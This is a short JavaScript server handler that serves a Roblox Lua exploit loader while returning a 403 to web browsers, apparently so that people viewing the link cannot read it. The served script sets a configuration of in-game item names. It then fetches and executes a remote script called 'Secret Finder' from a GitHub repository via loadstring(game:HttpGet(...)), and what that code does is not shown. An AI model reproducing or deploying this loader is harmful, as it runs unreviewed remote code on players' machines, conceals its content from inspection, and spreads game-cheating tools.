export default function handler(req, res) {
  const userAgent = req.headers["user-agent"] || "";
  const accept = req.headers["accept"] || "";

  if (userAgent.includes("Mozilla") || accept.includes("text/html")) {
    res.status(403).send("🚫 ممنوع الوصول إلى هذا الملف مباشرة من المتصفح.");
    return;
  }

  res.setHeader("Content-Type", "text/plain");

  res.send(`getgenv().BrainrotConfig = {
    ["Garama And Madundung"] = true,
    ["La Grande Combinasion"] = true,
    ["Graipuss Medussi"] = true,
    ["Los Tralaleritos"] = true,
    ["Sammyni Spyderini"] = true,
    ["La Vacca Saturno Saturnita"] = true,
    ["Trenostruzzo Turbo 3000"] = false,
    ["Matteo"] = false,
    ["Odin Din Din Dun"] = false,
    ["Tralalero Tralala"] = false,
    ["Unclito Samito"] = false,
    ["Girafa Celestre"] = false,
    ["Cocofanto Elefanto"] = false
}

loadstring(game:HttpGet(\"https://raw.githubusercontent.com/iw929wiwiw/Secret-Only/refs/heads/main/Secret%20Finder\"))();`);
}